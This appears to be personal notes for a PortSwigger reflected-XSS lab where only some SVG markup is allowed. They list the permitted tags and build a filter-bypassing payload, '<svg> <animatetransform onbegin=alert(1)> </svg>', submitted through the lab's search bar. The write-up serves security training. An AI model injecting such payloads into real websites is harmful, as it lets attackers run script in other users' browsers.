
### Reflected XSS with some SVG markup allowed : PRACTITIONER

---

> Do the same technique as [[Portswigger/XSS/Lab 13|Lab 13]] to get the available tags.
* `<svg>`
* `<animatetransform`
* `<title>`
* `<image`

> We will use a payload looking like this since `svg` is a tag that allows for other tags inside it.
```
<svg> <animatetransform XX=alert(1)> </svg>
```

> Do the same technique as [[Portswigger/XSS/Lab 11|Lab 11]] to get the available events with that tag, we get the `onbegin` attribute.

> So our payload is now
```
<svg> <animatetransform onbegin=alert(1)> </svg>
```

> Put that in the search bar and submit to see the pop-up and complete the lab.

---
